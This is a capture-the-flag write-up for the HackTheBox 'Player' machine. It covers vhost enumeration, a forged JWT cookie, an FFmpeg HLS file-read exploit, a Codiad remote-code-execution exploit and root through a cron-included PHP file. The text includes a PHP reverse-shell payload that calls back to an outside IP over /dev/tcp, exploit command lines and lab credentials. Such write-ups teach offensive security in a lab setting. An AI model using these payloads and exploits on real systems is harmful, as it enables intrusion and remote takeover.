---
title: "HackTheBox - WriteUp 16"
date: 2019-07-17T21:06:35+08:00
description: "HackTheBox 练手 - Player - Code Review with FFMPEG Vuln"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Player

Nmap enum 22(SSH 6.6.1p1), 80(Apache Web 2.4.7 With PHP 5.5.9), 6686(SSH 7.2p1)

## User

First, access 80, get 403. We need enum vhost.

Use gobuster here: `gobuster vhost -r -u http://player.htb -o /tmp/player1.log -w ./subdomains-top1mil-20000.txt -s 200`, Found: `dev` `staging` `chat`

Add the following lines into `/etc/hosts`:

```
10.10.10.145 dev.player.htb
10.10.10.145 staging.player.htb
10.10.10.145 chat.player.htb
10.10.10.145 player.htb
```

Check `chat`, you'll know there's application backup file disclosure and credentials leak in other places.

Then enum dir `gobuster dir -u http://staging.player.htb -s 200,204,301,302,307 -o /tmp/dirbplayer.log -w ./directory-list-2.3-medium.txt -x html,php,htm,txt`, nothing special.

Then enum dir `gobuster dir -u http://player.htb -s 200,204,301,302,307 -o /tmp/dirbplayer_main.log -w ./directory-list-2.3-medium.txt -x html,php,htm,txt`, found `/launcher`.

After that, go to Staging, Check all pages, found a contact form, submit anything, you'll see a error page flashing... Then, enable burpsuite, catch the local file disclosure:

```php
array(3) { 
    [0]=> array(4) { 
        ["file"]=> string(28) "/var/www/staging/contact.php" 
        ["line"]=> int(6) 
        ["function"]=> string(1) "c" 
        ["args"]=> array(1) { 
            [0]=> &string(9) "Cleveland" } 
        } 
    [1]=> array(4) { 
        ["file"]=> string(28) "/var/www/staging/contact.php" 
        ["line"]=> int(3) 
        ["function"]=> string(1) "b" 
        ["args"]=> array(1) { 
            [0]=> &string(5) "Glenn" } 
        } 
    [2]=> array(4) { 
        ["file"]=> string(28) "/var/www/staging/contact.php" 
        ["line"]=> int(11) 
        ["function"]=> string(1) "a" 
        ["args"]=> array(1) { 
            [0]=> &string(5) "Peter" } 
        } 
    } 
Database connection failed.
Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.php
```
Check the source code of Dev, app.js showed Codiad WebIDE, 0-Day RCE can be found here: https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit

Then check `player.htb/launcher` source code, you'll get a php named in a strange way. Check about backup file, found: `http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~`, It's about JSON Web Token, according to its code, The JWT Token can be build as is:

- Algorithm: HS256
- Type: JWT
- Base64Encoded Secret: /S0/R@nd0m/P@ss/
- Correct Payload:  `{"project": "PlayBuff","access_code":"0E76658526655756207688271159624026011393"}`

So, Use the above param, you get the cookie: `access = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.GgZP6ZYiWPFtzyHxGVn6Cl_PFkt0UpBe8cTyTF13ot4`

Clear all your current cookies, then set cookie above, open `http://player.htb/launcher/`, input anything into the form, then submit. You'll be redirected to: `http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/`, You'll see a Secure Video Page. Mostly, video convert use FFMpeg, so let's search, found this: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS`

Run exploit with: `python3 ./gen_avi_bypass.py file:///var/www/backup/service_config backup_servc.avi` to read the file we just get from error message. Get output downloaded. You will found a cred: `telegen:d-bC|jC!2uepS/w`.

Try to logged in via SSH, get limited shell and cannot escape. Next, try `https://www.exploit-db.com/exploits/39569` , after you get xauth shell, run `.readfile /var/www/staging/fix.php`, you will get another creds: `peter:CQXpm\z)G5D#%S$y=`

Logged into dev site, you found no plugin manager, so you can't upload anything. Try `https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit`, with `python2 ./exploit.py http://dev.player.htb/ peter "CQXpm\\z)G5D#%S\$y=" 10.10.16.80 4499 linux`, you'll get a reverse shell as `www-data`.

Use Python 3 to spawn a pty, `python3 -c "import pty; pty.spawn('/bin/bash')"`, then `su -s /bin/bash telegen`, use the creds above, you can access the user flag.

## Root

Run `pspy64`, then upload a php file:

```php
<?php 
shell_exec("bash -c 'bash -i &>/dev/tcp/10.10.16.80/23032 0<&1'"); 
?>
```

According to pspy, cron run a PHP per minute, which located at: `/var/lib/playbuff/buff.php`

```php
<?php
include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");
class playBuff
{
        public $logFile="/var/log/playbuff/logs.txt";
        public $logData="Updated";

        public function __wakeup()
        {
                file_put_contents(__DIR__."/".$this->logFile,$this->logData);
        }
}
$buff = new playBuff();
$serialbuff = serialize($buff);
$data = file_get_contents("/var/lib/playbuff/merge.log");
if(unserialize($data))
{
        $update = file_get_contents("/var/lib/playbuff/logs.txt");
        $query = mysqli_query($conn, "update stats set status='$update' where id=1");
        if($query)
        {
                echo 'Update Success with serialized logs!';
        }
}
else
{
        file_put_contents("/var/lib/playbuff/merge.log","no issues yet");
        $update = file_get_contents("/var/lib/playbuff/logs.txt");
        $query = mysqli_query($conn, "update stats set status='$update' where id=1");
        if($query)
        {
                echo 'Update Success!';
        }
}
?>
```

The file content of `/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php`:

```php
<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "integrity";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
?>
```

Included PHP will be executed, so just append the shell you just uploaded to `dee8dc8a47256c64630d803a4c40786g.php`: `cat shell.php >> dee8dc8a47256c64630d803a4c40786g.php`.

Then open an nc before you append, you will get a root shell.

(END)

# Referrence

- https://www.exploit-db.com/exploits/39569
- https://www.rapid7.com/db/vulnerabilities/http-php-temporary-file-source-disclosure
- https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit
- https://jwt.io
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
- https://github.com/firebase/php-jwt
- https://stackoverflow.com/questions/12823770/does-php-code-execute-when-included

# Further Reading: Improvement

- https://www.netsparker.com/blog/web-security/untrusted-data-unserialize-php/
- https://www.notsosecure.com/remote-code-execution-via-php-unserialize/
- https://securitycafe.ro/2015/01/05/understanding-php-object-injection/
- https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-dirty-cow-linux-vulnerability


